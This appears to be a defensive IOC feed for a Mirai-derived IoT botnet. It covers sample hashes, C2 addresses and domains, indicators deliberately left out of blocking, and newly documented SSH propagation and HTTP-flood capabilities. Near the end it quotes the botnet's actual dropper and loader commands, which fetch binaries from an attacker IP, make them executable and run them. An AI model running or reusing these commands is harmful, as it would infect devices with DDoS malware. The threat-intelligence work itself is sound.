# ==============================================================
# MIRAI_OHSHIT — IOC Feed
# Author   : AfterPacket
# Captured : 2026-08-04T07:42:55Z .. 2026-08-07T19:04:06Z
# TLP      : TLP:WHITE
# Source   : Drosera honeypot / static analysis
# ==============================================================
#
# MD5 and SHA-1 for every sample in this capture:
#   ../reports/CAPTURE_20260807_hashes.txt
# Encrypted samples: ../samples/<sha256>.zip  (AES-256, password: infected)

# [HASHES — SHA-256]
# Stage 1 — one-line fetcher, written to /tmp/.p over telnet
de9cfdf7d1330534731e8354ec5927db99e06365850a8fe1d07c6bf8dec97ad0   # /tmp/.p, 104 B
# Stage 2 — multi-arch loader
8b1a2fb6b358484b7769aeeb63209f2b277d91b5015cf28ce471a67e0ef83d28   # /ohshit.sh, 2527 B
# Stage 3 — ELF payloads (7 of 16 architectures captured)
81ea2a392b6d71c7cd381f48ebffb992457a1d3897d1484a3fd7823f2e9f69a3   # //bot.arm7,   727832 B
15b950d6b732fba9021b829331a2277c1d88609b60b4238a34fcbfea676f465d   # //bot.sh4,    891044 B
78a57de8eb7d70af3d44dda3ea3fc11ed44879d34db45fb8c22211b852398763   # //bot.arm,    956852 B
7b8add306d87da91ed1ff4608ad8f829c83f6035cbc852c73869ec66977d93f8   # //bot.mips,  1121448 B
98994017c070389b3ddfe557847dc6aaa00ce7bc79760faf3dcfe68036b56431   # //bot.ppc,   1185928 B
2ae7dc16ca036cb5c2c7ce2cd8099edb07d96b8846188c92eb39a7feba2fec08   # //bot.i686,  1206876 B
9d7cd4948a1fcbaeadc425752fce9a933bd6fc41eeede030dffd7b99b3bc51d5   # //bot.x86_64,1357648 B

# [IP ADDRESSES]
# Confidence: HIGH — direct honeypot capture (telnet) AND hardcoded payload host
94.154.43.123   # dropper delivery + serves /ohshit.sh and //bot.<arch>
# Confidence: HIGH — compiled into all 7 ELF payloads
45.61.161.207   # C2
45.83.140.28    # C2
5.101.221.87    # C2
51.15.68.114    # C2 (Scaleway)
94.130.53.201   # C2 (Hetzner)
195.201.24.6    # C2 (Hetzner)
#
# EXCLUDED — extracted from the same payloads, deliberately NOT blocked:
#   185.199.108.153   GitHub Pages — shared CDN, blocking breaks real traffic
#   104.21.234.17     Cloudflare   — shared CDN, same reason
#   1.2.3.4           documentation placeholder, not a host
#   131.0.0.0         network address, not a host
# Anyone re-running extraction will see these. They are excluded on purpose,
# not overlooked. Adding CDN addresses to a blocklist is the single most
# damaging mistake this feed can make.

# [DOMAINS — C2, extracted from all 7 ELF payloads]
# The loader chain (stages 1 and 2) uses bare IPs exclusively. The ELF
# payloads carry a compiled-in domain set, identical across all seven
# architecture builds:
api-relay-3.metrics-collector.io    # C2
cdn-edge-updates.hostcloud-eu.net   # C2
mgmt-panel.serverstats-daemon.com   # C2
sync.softwaremirror.workers.dev     # C2, Cloudflare Workers-hosted
glibc.malloc.top                    # C2
control.tor2web-relay-fast.onion    # C2 over Tor, see note below
#
# NAMING TTP: every one impersonates infrastructure a sysadmin would skim
# past — a metrics collector, CDN edge updates, a server stats daemon, a
# software mirror, and glibc's allocator. Treat "plausible-looking
# infrastructure hostname you do not recognise" as a signal, not a comfort.
#
# The .onion name is NOT in blocklist.txt: .onion does not resolve through
# normal DNS, so a DNS/IP blocklist entry accomplishes nothing. Control Tor
# egress and tor2web gateways instead.
#
# DO NOT BLOCK — also present in these payloads:
#   bugs.launchpad.net    glibc build boilerplate, not infrastructure
#   workers.dev (apex)    Cloudflare Workers; only the specific
#                         sync.softwaremirror subdomain is attacker-owned
#
# CORRECTION: an earlier revision of this feed stated these TLDs returned
# zero and were false positives. That was wrong. The anchored pattern used
# to "rule them out" required a single label before the TLD, so it rejected
# every multi-label domain — the character preceding "metrics-collector.io"
# is a dot, which the anchor excluded. Anchoring domain patterns is correct;
# anchoring them so tightly that <sub>.<domain>.<tld> cannot match is not.

# [SSH PROTOCOL STRING — benign, for the record]
#   openssh.com
# Present, but as the @openssh.com suffix on OpenSSH algorithm names
# (chacha20-poly1305@openssh.com). Not C2, not blocked. It did surface a
# real capability — see [SSH PROPAGATION] below.

# [SSH PROPAGATION — capability, not previously documented]
# The payloads embed a full SSH client: ssh-ed25519, curve25519, chacha20,
# aes128-ctr and hmac-sha2 algorithm strings are all present, alongside the
# @openssh.com suffix strings.
#
# This family therefore propagates over SSH as well as telnet. The loader
# chain is telnet-only, so anyone scoping containment from the dropper alone
# will miss the SSH vector entirely. Audit SSH auth logs on affected hosts,
# not just telnet.

# [PORTS]
80    # HTTP — payload retrieval from 94.154.43.123

# [HTTP INDICATORS]
# Endpoint: http://94.154.43.123/ohshit.sh
# Endpoint: http://94.154.43.123//bot.<arch>   <- note the DOUBLED SLASH
# The doubled slash after the host is a reliable, low-noise detection string.

# [CAMPAIGN METADATA]
# Family      : MIRAI_OHSHIT (Mirai-derived multi-arch IoT botnet)
# Stage 1     : /tmp/.p written directly over telnet (shell-write)
# Stage 2     : /ohshit.sh, staged in /tmp/ via busybox
# Staging file: WTF  (payload cat'd into this name, then chmod +x *, then ./WTF)
# Architectures attempted (15):
#   x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4
# Captured 7 of 15 — arm, arm7, sh4, mips, i686, ppc, x86_64
#   CORRECTED 2026-08-08: earlier revisions said 16. Counted directly from
#   ohshit.sh — lines 4-18, one fetch line per architecture, 15 lines. The
#   architecture list itself was always right; only the count was wrong.
#   8 builds remain uncaptured, not 9.
# VirusTotal  : no VT record for any sample in this family at capture time
#               (sidecar scan is null — this is absence of data, NOT a clean verdict)

# [OBFUSCATED CONFIG — XOR 0x22 — added 2026-08-08]
# All 7 ELF payloads carry a single-byte-XOR obfuscated region, key 0x22.
# That is Mirai's table.c scheme: config is XORed with the four bytes of
# TABLE_KEY, and the leaked-source default 0xdeadbeef collapses to one
# effective byte (0xef ^ 0xbe ^ 0xad ^ 0xde == 0x22).
#
# Plaintext string extraction cannot see this region. It was missed until a
# dedicated XOR sweep was run. Recovered contents:
#
#   HTTP scaffolding : "HTTP/1.1", "User-Agent:", "Accept:",
#                      "Accept-Language:", "Accept-Encoding:", "Referer:"
#   User-Agent pool  : large rotating list — MSIE 8/9/10, Trident 4/5/6,
#                      Firefox/Gecko builds
#   Referer pool     : 20 URLs of real, legitimate sites
#   UA source        : http://www.useragentstring.com/Firefox25.0_id_19710.php
#
# CAPABILITY FINDING: this is a Layer-7 HTTP flood module with User-Agent
# and Referer randomisation. This family is a DDoS platform, not merely a
# loader. Not previously documented.
#
# *** NO C2 IS HIDDEN IN THE XOR REGION ***
# Verified across all 7 builds. Every IP-shaped string recovered is a
# version-number fragment (rv:1.9.0.8, .NET CLR ...) or a network address,
# and every domain recovered is a legitimate Referer target. The blocklist
# is unaffected by this finding — which independently confirms it complete.
#
# *** DO NOT BLOCKLIST THE RECOVERED REFERER DOMAINS ***
#   www.google.com  www.facebook.com  twitter.com  www.instagram.com
#   www.reddit.com  www.youtube.com   www.bing.com  www.linkedin.com
#   t.co  duckduckgo.com  search.yahoo.com  www.tiktok.com
#   www.pinterest.com  www.baidu.com  www.cloudflare.com  github.com
#   stackoverflow.com  news.ycombinator.com  discord.com  telegram.org
#   www.useragentstring.com
# These are flood Referer VALUES, not infrastructure. An automated
# "extract domains from malware -> blocklist" pipeline would ingest them
# and remove the estate's access to most of the internet. This is the most
# damaging mistake available anywhere in this capture.
#
# Detection: YARA $x1-$x4 use the xor(0x22) modifier; Suricata 9001011 and
# 9001012 cover the flood traffic (both thresholded — a single flood request
# is by design indistinguishable from a browser).

# [FULL STAGE-1 CONTENT]
# cd /tmp; wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh

# [STAGE-2 LOOP BODY, per architecture]
# wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;\
#   cat bot.<arch> >WTF;chmod +x *;./WTF

# [HOST-BASED GREP STRINGS]
# "94.154.43.123"
# "ohshit.sh"
# "//bot."
# "cat bot."
# ">WTF"
# "chmod +x *;./WTF"

# [HOST HUNT]
# grep -rl "94.154.43.123" /tmp /var/tmp /home /root 2>/dev/null
# ls -la /tmp/.p /tmp/WTF /tmp/bot.* 2>/dev/null
# find / -name "WTF" -type f 2>/dev/null
